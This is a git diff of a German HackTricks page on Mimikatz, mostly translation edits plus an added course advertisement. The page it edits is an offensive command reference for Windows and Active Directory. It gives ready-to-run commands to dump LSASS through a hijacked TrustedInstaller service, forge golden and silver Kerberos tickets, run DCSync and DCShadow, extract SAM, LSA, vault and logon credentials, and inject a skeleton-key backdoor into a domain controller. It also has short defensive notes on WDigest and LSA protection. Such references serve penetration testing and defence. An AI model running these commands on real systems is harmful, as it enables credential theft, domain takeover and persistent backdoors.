@@ -1,27 +1,34 @@
 # Mimikatz
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
+
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Vertiefen Sie Ihr Fachwissen in **Mobilsicherheit** mit der 8kSec Academy. Meistern Sie die Sicherheit von iOS und Android durch unsere selbstgesteuerten Kurse und erhalten Sie ein Zertifikat:
+
+{% embed url="https://academy.8ksec.io/" %}
+
 
 **Diese Seite basiert auf einer von [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Überprüfen Sie das Original für weitere Informationen!
 
 ## LM und Klartext im Speicher
 
-Seit Windows 8.1 und Windows Server 2012 R2 wurden erhebliche Maßnahmen ergriffen, um gegen den Diebstahl von Anmeldeinformationen zu schützen:
+Seit Windows 8.1 und Windows Server 2012 R2 wurden erhebliche Maßnahmen ergriffen, um sich gegen den Diebstahl von Anmeldeinformationen zu schützen:
 
-- **LM-Hashes und Klartext-Passwörter** werden nicht mehr im Speicher gespeichert, um die Sicherheit zu erhöhen. Eine spezifische Registrierungseinstellung, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ muss mit einem DWORD-Wert von `0` konfiguriert werden, um die Digest-Authentifizierung zu deaktivieren und sicherzustellen, dass "Klartext"-Passwörter nicht in LSASS zwischengespeichert werden.
+- **LM-Hashes und Klartext-Passwörter** werden nicht mehr im Speicher gespeichert, um die Sicherheit zu erhöhen. Eine spezifische Registrierungseinstellung, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ muss mit einem DWORD-Wert von `0` konfiguriert werden, um die Digest-Authentifizierung zu deaktivieren, sodass "Klartext"-Passwörter nicht in LSASS zwischengespeichert werden.
 
 - **LSA-Schutz** wird eingeführt, um den Local Security Authority (LSA)-Prozess vor unbefugtem Lesen des Speichers und Code-Injektionen zu schützen. Dies wird erreicht, indem LSASS als geschützter Prozess markiert wird. Die Aktivierung des LSA-Schutzes umfasst:
 1. Ändern der Registrierung unter _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ durch Setzen von `RunAsPPL` auf `dword:00000001`.
@@ -31,7 +38,7 @@ Trotz dieser Schutzmaßnahmen können Tools wie Mimikatz den LSA-Schutz mit spez
 
 ### Gegenmaßnahmen zur Entfernung von SeDebugPrivilege
 
-Administratoren haben typischerweise SeDebugPrivilege, das es ihnen ermöglicht, Programme zu debuggen. Dieses Privileg kann eingeschränkt werden, um unbefugte Speicherauszüge zu verhindern, eine gängige Technik, die von Angreifern verwendet wird, um Anmeldeinformationen aus dem Speicher zu extrahieren. Selbst wenn dieses Privileg entfernt wird, kann das TrustedInstaller-Konto jedoch weiterhin Speicherauszüge mit einer angepassten Dienstkonfiguration durchführen:
+Administratoren haben typischerweise SeDebugPrivilege, das es ihnen ermöglicht, Programme zu debuggen. Dieses Privileg kann eingeschränkt werden, um unbefugte Speicherdumps zu verhindern, eine gängige Technik, die von Angreifern verwendet wird, um Anmeldeinformationen aus dem Speicher zu extrahieren. Selbst wenn dieses Privileg entfernt wird, kann das TrustedInstaller-Konto jedoch weiterhin Speicherdumps mit einer angepassten Dienstkonfiguration durchführen:
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
@@ -63,7 +70,7 @@ Das Manipulieren von Ereignisprotokollen in Mimikatz umfasst zwei Hauptaktionen:
 
 ### Kerberos Ticket Angriffe
 
-### Golden Ticket Erstellung
+### Erstellung eines Goldenen Tickets
 
 Ein Golden Ticket ermöglicht die impersonation mit domänenweiter Zugriffsberechtigung. Wichtiger Befehl und Parameter:
 
@@ -80,7 +87,7 @@ Beispiel:
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
-### Silver Ticket Creation
+### Silver Ticket Erstellung
 
 Silver Tickets gewähren Zugriff auf spezifische Dienste. Wichtiger Befehl und Parameter:
 
@@ -129,7 +136,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Active Directory Manipulation
 
-- **DCShadow**: Eine Maschine vorübergehend als DC für die AD-Objektmanipulation agieren lassen.
+- **DCShadow**: Temporär einen Computer als DC für die AD-Objektmanipulation agieren lassen.
 - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
 - **DCSync**: Einen DC nachahmen, um Passwortdaten anzufordern.
@@ -137,7 +144,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Zugriff auf Anmeldeinformationen
 
-- **LSADUMP::LSA**: Anmeldeinformationen aus LSA extrahieren.
+- **LSADUMP::LSA**: Extrahiert Anmeldeinformationen aus LSA.
 - `mimikatz "lsadump::lsa /inject" exit`
 
 - **LSADUMP::NetSync**: Einen DC mit den Passwortdaten eines Computer-Kontos nachahmen.
@@ -146,39 +153,39 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **LSADUMP::SAM**: Zugriff auf die lokale SAM-Datenbank.
 - `mimikatz "lsadump::sam" exit`
 
-- **LSADUMP::Secrets**: Geheimnisse entschlüsseln, die in der Registrierung gespeichert sind.
+- **LSADUMP::Secrets**: Entschlüsselt Geheimnisse, die in der Registrierung gespeichert sind.
 - `mimikatz "lsadump::secrets" exit`
 
-- **LSADUMP::SetNTLM**: Einen neuen NTLM-Hash für einen Benutzer festlegen.
+- **LSADUMP::SetNTLM**: Setzt einen neuen NTLM-Hash für einen Benutzer.
 - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
-- **LSADUMP::Trust**: Informationen zur Vertrauensauthentifizierung abrufen.
+- **LSADUMP::Trust**: Ruft Informationen zur Vertrauensauthentifizierung ab.
 - `mimikatz "lsadump::trust" exit`
 
 ### Sonstiges
 
-- **MISC::Skeleton**: Eine Hintertür in LSASS auf einem DC injizieren.
+- **MISC::Skeleton**: Injiziert eine Hintertür in LSASS auf einem DC.
 - `mimikatz "privilege::debug" "misc::skeleton" exit`
 
 ### Privilegieneskalation
 
-- **PRIVILEGE::Backup**: Backup-Rechte erwerben.
+- **PRIVILEGE::Backup**: Erwirbt Backup-Rechte.
 - `mimikatz "privilege::backup" exit`
 
-- **PRIVILEGE::Debug**: Debug-Rechte erhalten.
+- **PRIVILEGE::Debug**: Erhält Debug-Rechte.
 - `mimikatz "privilege::debug" exit`
 
-### Anmeldeinformationen dumpen
+### Anmeldeinformationen Dumping
 
-- **SEKURLSA::LogonPasswords**: Anmeldeinformationen für angemeldete Benutzer anzeigen.
+- **SEKURLSA::LogonPasswords**: Zeigt Anmeldeinformationen für angemeldete Benutzer an.
 - `mimikatz "sekurlsa::logonpasswords" exit`
 
-- **SEKURLSA::Tickets**: Kerberos-Tickets aus dem Speicher extrahieren.
+- **SEKURLSA::Tickets**: Extrahiert Kerberos-Tickets aus dem Speicher.
 - `mimikatz "sekurlsa::tickets /export" exit`
 
 ### SID- und Token-Manipulation
 
-- **SID::add/modify**: SID und SIDHistory ändern.
+- **SID::add/modify**: Ändert SID und SIDHistory.
 - Hinzufügen: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
 - Ändern: *Kein spezifischer Befehl für die Änderung im ursprünglichen Kontext angegeben.*
 
@@ -187,17 +194,23 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Terminaldienste
 
-- **TS::MultiRDP**: Mehrere RDP-Sitzungen zulassen.
+- **TS::MultiRDP**: Erlaubt mehrere RDP-Sitzungen.
 - `mimikatz "ts::multirdp" exit`
 
-- **TS::Sessions**: TS/RDP-Sitzungen auflisten.
+- **TS::Sessions**: Listet TS/RDP-Sitzungen auf.
 - *Kein spezifischer Befehl für TS::Sessions im ursprünglichen Kontext angegeben.*
 
 ### Vault
 
-- Passwörter aus dem Windows Vault extrahieren.
+- Extrahiert Passwörter aus dem Windows Vault.
 - `mimikatz "vault::cred /patch" exit`
 
+
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Vertiefen Sie Ihr Fachwissen in **Mobiler Sicherheit** mit der 8kSec Academy. Meistern Sie die Sicherheit von iOS und Android durch unsere selbstgesteuerten Kurse und erhalten Sie ein Zertifikat:
+
+{% embed url="https://academy.8ksec.io/" %}
 
 {% hint style="success" %}
 Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
@@ -205,7 +218,7 @@ Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data
 
 <details>
 
-<summary>HackTricks unterstützen</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
 * Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
 * **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
